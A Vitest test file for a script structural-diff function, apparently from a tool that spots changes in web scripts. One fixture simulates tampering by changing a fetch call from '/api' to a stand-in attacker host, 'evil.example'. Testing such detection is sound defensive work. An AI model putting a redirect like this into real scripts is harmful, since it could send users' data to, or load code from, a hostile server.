import { describe, expect, it } from 'vitest';
import { diffScripts } from '../../src/analysis/structural-diff.js';

describe('structural diff', () => {
  it('expands minified code so the change is visible on its own line', () => {
    const before = 'function a(){var x=1;return x}function b(){return fetch("/api")}';
    const after = 'function a(){var x=1;return x}function b(){return fetch("https://evil.example/c")}';
    const d = diffScripts(before, after);
    expect(d.mode).toBe('normalized');
    expect(d.addedLines).toBe(1);
    expect(d.removedLines).toBe(1);
    expect(d.patch).toContain('+  return fetch("https://evil.example/c");');
  });

  it('ignores formatting-only differences', () => {
    const d = diffScripts('a(1);b(2)', 'a( 1 );\n// comment\nb( 2 );');
    expect(d.addedLines + d.removedLines).toBe(0);
  });

  it('falls back to raw text when a version does not parse', () => {
    const d = diffScripts('a(1)', 'a(1');
    expect(d.mode).toBe('raw');
  });

  it('truncates very long diffs', () => {
    const before = Array.from({ length: 1000 }, (_, i) => `var v${i} = ${i};`).join('\n');
    const after = Array.from({ length: 1000 }, (_, i) => `var v${i} = ${i + 1};`).join('\n');
    const d = diffScripts(before, after, { maxLines: 50 });
    expect(d.truncated).toBe(true);
    expect(d.patch).toContain('diff truncated');
  });
});
